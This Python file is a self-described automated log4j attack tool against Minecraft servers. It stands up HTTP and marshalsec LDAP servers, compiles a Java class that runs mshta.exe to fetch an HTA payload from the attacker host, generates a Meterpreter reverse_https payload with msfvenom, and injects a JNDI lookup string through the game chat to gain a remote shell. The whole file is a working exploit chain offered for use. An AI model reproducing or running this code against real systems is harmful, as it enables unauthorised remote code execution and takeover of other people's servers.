import subprocess
import os
import psutil
import sys
import argparse
from time import sleep
from colorama import Fore, Style

def start_HTTP_Server():
    lsof_process = subprocess.run(["lsof", "-t", "-i", ":8000"], capture_output=True, text=True)
    pid_output = lsof_process.stdout.strip()

    if pid_output:
        pid = pid_output.split('\n')[0]  

        subprocess.run(["kill", "-9", pid])
        print(f"[+] Process with PID {pid} killed.")

    subprocess.Popen(["python", "-m", "http.server", "8000"], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    print('[+] HTTP Server is listening..')


def start_LDAP_Server(LHOST):
    lsof_process = subprocess.run(["lsof", "-t", "-i", ":1389"], capture_output=True, text=True)
    pid_output = lsof_process.stdout.strip()

    if pid_output:
        # Extract the PID from the output
        pid = pid_output.split('\n')[0]  # Get the first PID if there are multiple

        # Kill the process using the obtained PID
        subprocess.run(["kill", "-9", pid])
        print(f"[+] Process with PID {pid} killed.")

    command = ['java', '-cp', 'marshalsec-0.0.3-SNAPSHOT-all.jar', 'marshalsec.jndi.LDAPRefServer', f'http://{LHOST}:8000/#Exploit']
    subprocess.Popen(command, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    print('[+] LDAP Server is listening..')





def kill_processes():
    print(f"{Fore.YELLOW}[*] Cleaning processes...{Style.RESET_ALL}")
    # Iterate over all running processes
    for proc in psutil.process_iter(['pid', 'cmdline']):
        # Check if the command line contains the keyword
        if proc.info['cmdline'] and "./MinecraftClient-20240130-245-linux-x64" in ' '.join(proc.info['cmdline']):
            print(f"[+] Terminating process with PID {proc.info['pid']}")
            proc.kill()
    lsof_process = subprocess.run(["lsof", "-t", "-i", ":8000"], capture_output=True, text=True)
    pid_output = lsof_process.stdout.strip()
    if pid_output:
        pid = pid_output.split('\n')[0] 
        subprocess.run(["kill", "-9", pid])
        print(f"[+] Process with PID {pid} killed.")

    lsof_process = subprocess.run(["lsof", "-t", "-i", ":1389"], capture_output=True, text=True)
    pid_output = lsof_process.stdout.strip()
    if pid_output:
        pid = pid_output.split('\n')[0]  
        subprocess.run(["kill", "-9", pid])
        print(f"[+] Process with PID {pid} killed.")


def ExploitLinux(LHOST):
    data = '''
public class Exploit {
    public Exploit() {}
    static {
        try {
            String[] cmds = {
                 "cmd.exe", "/c", "start","mshta.exe", "http://%s:8000/theload.hta"
            };
            java.lang.Runtime.getRuntime().exec(cmds).waitFor();
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
    public static void main(String[] args) {
        Exploit e = new Exploit();
    }
}
''' % LHOST


    with open("./Exploit.java", 'w') as file:
        file.write(data)
    
    sleep(3)
    command = ['./jdk1.8.0_181/bin/javac', './Exploit.java', ]
    subprocess.call(command, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
    if os.path.isfile('./Exploit.class'):
        print("[+] Exploit compiled...")
    else:
        print("[-] FAILED TO COMPILE EXPLOIT!")
        exit(1)
    command = ['msfvenom', '-p', 'windows/x64/meterpreter/reverse_https', 'LHOST=tun0', 'LPORT=4444', '-f', 'hta-psh']

    with open('./theload.hta', 'wb') as f:
        process = subprocess.Popen(command, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
        stdout, stderr = process.communicate()
        f.write(stdout.encode())
    if os.path.isfile('./theload.hta'):
        print("[+] Malware generated...")
    else:
        print("[-] FAILED TO GENERATE MALWARE!")
        exit(1)

def ExploitWindows(LHOST):
    data = '''
public class Exploit {
    public Exploit() {}
    static {
        try {
            String[] cmds = {
                 "cmd.exe", "/c", "start","mshta.exe", "http://%s:8000/theload.hta"
            };
            java.lang.Runtime.getRuntime().exec(cmds).waitFor();
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
    public static void main(String[] args) {
        Exploit e = new Exploit();
    }
}
''' % LHOST


    with open("./Exploit.java", 'w') as file:
        file.write(data)
    
    sleep(3)
    command = ['./jdk1.8.0_181/bin/javac', './Exploit.java', ]
    subprocess.call(command, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
    if os.path.isfile('./Exploit.class'):
        print("[+] Exploit compiled...")
    else:
        print("[-] FAILED TO COMPILE EXPLOIT!")
        exit(1)
    command = ['msfvenom', '-p', 'windows/x64/meterpreter/reverse_https', 'LHOST=tun0', 'LPORT=4444', '-f', 'hta-psh']

    with open('./theload.hta', 'wb') as f:
        process = subprocess.Popen(command, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
        stdout, stderr = process.communicate()
        f.write(stdout.encode())
    if os.path.isfile('./theload.hta'):
        print("[+] Malware generated...")
    else:
        print("[-] FAILED TO GENERATE MALWARE!")
        exit(1)

def authAndSend(minecraftUser, minecraftPass, IP,LHOST):
    start_HTTP_Server()
    start_LDAP_Server(LHOST)
    print(f"[+] SCRIPT EXECUTION PAUSED!!! Please execute the following in a new terminal!: ")
    print(f"({Fore.MAGENTA}msfconsole -x \"use exploit/multi/handler; set payload windows/x64/meterpreter/reverse_https; set LHOST {LHOST};set LPORT 4444;run\"{Style.RESET_ALL})")
    input("[*] Press enter once your listener has started....")
    payload = "${jndi:ldap://%s:1389/e}" % LHOST
    
    command = ['./MinecraftClient-20240130-245-linux-x64', f'{minecraftUser}', f'{minecraftPass}',f'{IP}']
    process = subprocess.Popen(command, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
    loading_symbols = ['|', '/', '-', '\\']
    while True:

        output_line = process.stdout.readline()
        # Print  animation
        for symbol in loading_symbols * 10:
            print(f"\r[{symbol}] Sending payload of {Fore.RED}{payload}{Style.RESET_ALL}", end='', flush=True)
            sleep(0.1)  # Adjust the delay as needed
            sys.stdout.write("\b")  # Move cursor back
        if not output_line:  
            print(f"{Fore.RED}\n[+] ERROR! the server didnt respond as expected hmmmm...{Style.RESET_ALL}")
            exit(1)
        if "[MCC] Server was successfully joined" in output_line:
            print(f"{Fore.GREEN}\n[+] Successfully joined the Minecraft server!!{Style.RESET_ALL}")
            break
        
        if "[MCC] Connection has been lost." or "Failed to ping this IP" in output_line:
            print(f"{Fore.RED}\n[-] Failed to join the Minecraft server!! Is it up?{Style.RESET_ALL}")
            kill_processes()
            exit(1)
        if "Microsoft authenticate failed:" in output_line:
            print(f"{Fore.RED}\n[-] Failed to authenticate... you got fat fingers?{Style.RESET_ALL}")
            kill_processes()
            exit(1)




    process.stdin.write(f"{payload}\n")
    process.stdin.flush()
    print(f"{Fore.MAGENTA}[+] Payload sent.. Be patient and watch for a shell! if no shell then no vuln..{Style.RESET_ALL}")
    print(f"{Fore.MAGENTA}[+] Orrrr you can try again!{Style.RESET_ALL}")
    sleep(10)
    print("[+] Leaving the server...")
    process.stdin.write(f"/quit\n")
    process.stdin.flush()
    kill_processes()
    

if __name__ == '__main__':
    ascii_art = f"""{Fore.LIGHTRED_EX}
███╗   ███╗ █████╗ ██╗    ██╗██╗  ██╗    ███████╗ ██████╗██████╗ ██╗██████╗ ████████╗███████╗
████╗ ████║██╔══██╗██║    ██║██║ ██╔╝    ██╔════╝██╔════╝██╔══██╗██║██╔══██╗╚══██╔══╝██╔════╝
██╔████╔██║███████║██║ █╗ ██║█████╔╝     ███████╗██║     ██████╔╝██║██████╔╝   ██║   ███████╗
██║╚██╔╝██║██╔══██║██║███╗██║██╔═██╗     ╚════██║██║     ██╔══██╗██║██╔═══╝    ██║   ╚════██║
██║ ╚═╝ ██║██║  ██║╚███╔███╔╝██║  ██╗    ███████║╚██████╗██║  ██║██║██║        ██║   ███████║
╚═╝     ╚═╝╚═╝  ╚═╝ ╚══╝╚══╝ ╚═╝  ╚═╝    ╚══════╝ ╚═════╝╚═╝  ╚═╝╚═╝╚═╝        ╚═╝   ╚══════╝
     {Style.RESET_ALL}                                                                                      
    """
    print(ascii_art)
    parser = argparse.ArgumentParser(description="AutoPwn Script for Minecraft Servers vulnerable to log4j", usage= "sudo MinecraftAutoPwn.py")
    parser.add_argument('-u', dest='minecraftUser', help="Minecraft username/email", required=True)
    parser.add_argument('-i', dest='IP',help= "Minecraft Server IP",required=True)
    parser.add_argument('-l', dest='LHOST',help= "Local host",required=True)

    args = parser.parse_args()

    minecraftPass = input(f"[+] Enter the account password: ")
    if minecraftPass == "":
        print("[-] This script does not support anonymous auth..")
        exit(1)
    kill_processes()
    print(f"[+] Attacking: {Fore.RED}{args.IP}{Style.RESET_ALL}")
    ExploitWindows(args.LHOST)
    authAndSend(args.minecraftUser,minecraftPass,args.IP,args.LHOST)